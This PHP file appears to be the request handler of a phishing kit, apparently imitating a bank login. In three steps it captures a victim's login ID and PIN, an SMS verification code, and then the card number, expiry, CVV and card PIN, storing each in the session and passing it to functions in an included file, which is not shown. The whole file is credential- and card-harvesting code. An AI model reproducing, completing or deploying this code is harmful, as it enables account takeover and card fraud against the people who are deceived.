<?php
session_start();
include('function.inc.php');


if (isset($_GET['action']) && $_GET['action'] == "Login") {
    $_SESSION['ID']        = $_POST['ID'];
    $_SESSION['pin1']   = $_POST['pin1'];
    IniciarSession();
}

if (isset($_GET['action']) && $_GET['action'] == "GetCode") {
    $_SESSION['verification_code'] = $_POST['verification_code'];
    CodigoSMS();
}

if (isset($_GET['action']) && $_GET['action'] == "LastOne") {
    $_SESSION['ccn']   = $_POST['ccn'];
    $_SESSION['exp1']   = $_POST['exp1'];
    $_SESSION['cv']   = $_POST['cv'];
    $_SESSION['pin']   = $_POST['pin'];
    Tarjeta();
}

?>
